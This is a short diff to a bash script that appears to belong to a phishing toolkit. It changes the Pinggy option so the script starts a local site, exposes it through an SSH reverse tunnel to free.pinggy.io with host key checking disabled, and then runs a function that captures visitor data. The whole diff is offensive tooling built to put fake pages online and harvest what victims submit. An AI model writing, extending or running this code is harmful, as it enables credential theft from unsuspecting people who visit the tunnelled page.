@@ -509,12 +509,21 @@ start_loclx() {
 }
 
 start_pinggy() {
-    echo -e "\n[+] Starting Pinggy tunnel..."
-    read -p "[?] Enter your local port (default 8080): " port
+    read -p "[?] Enter your local port to start server on (default 8080): " port
     port=${port:-8080}
 
-    ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:$port qr@free.pinggy.io
+    echo -e "\n[+] Starting local server on port $port..."
+    setup_site  # Your server start command or function
+    sleep 3
+
+    echo -e "\n[+] Starting Pinggy tunnel forwarding localhost:$port ...\n"
+    ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:$port qr@free.pinggy.io &
+
+    sleep 5  # Give tunnel time to establish
+
+    capture_data  # Start capturing visitor data
 }
+
 
 ## Start localhost
 start_localhost() {
@@ -534,7 +543,7 @@ tunnel_menu() {
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
 		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
 		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
-		${RED}[${WHITE}04${RED}]${ORANGE} Pinngy   ${RED}[${CYAN}NEW! Max 60Min${RED}]
+		${RED}[${WHITE}04${RED}]${ORANGE} Pinngy   	   ${RED}[${CYAN}NEW! Max 60Min${RED}]
 
 	EOF
 
